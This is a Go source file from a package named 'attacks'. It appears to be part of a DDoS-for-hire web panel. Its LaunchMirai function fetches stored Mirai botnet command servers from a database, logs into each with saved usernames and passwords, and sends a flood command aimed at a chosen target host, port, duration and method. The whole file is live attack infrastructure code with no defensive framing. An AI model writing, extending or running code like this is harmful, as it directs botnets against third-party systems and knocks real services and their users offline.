package attacks

import (
	"fmt"
	"net"
	"time"
	"webserver/src/config"
	"webserver/src/database"
)

func LaunchMirai(host string, port string, tm string, method string) error {
	mirais, err := database.FetchMirais()
	if err != nil {
		return err
	}
	if mirais == nil {
		return err
	}

	for _, mirai := range mirais {
		dialer := &net.Dialer{
			Timeout: 2 * time.Second,
		}
		conn, err := dialer.Dial("tcp4", fmt.Sprintf("%s:%d", mirai.Host, mirai.Port))
		if err != nil {
			fmt.Printf("(mirai) Failed To Connect To %s:%d\r\n", mirai.Host, mirai.Port)
			return err
		}
		conn.Write([]byte(mirai.Username + "\r\n"))
		conn.Write([]byte(mirai.Password + "\r\n"))

		for _, v := range config.Cfg.MiraiMethods {
			if method == v.Name {
				cmd := BuildCommand(v.Command, host, port, tm)
				conn.Write([]byte(cmd))
				fmt.Printf("(mirai) Sent Command To ID: %d | CMD : %s\r\n", mirai.Id, cmd)
			}
		}
	}
	return nil
}
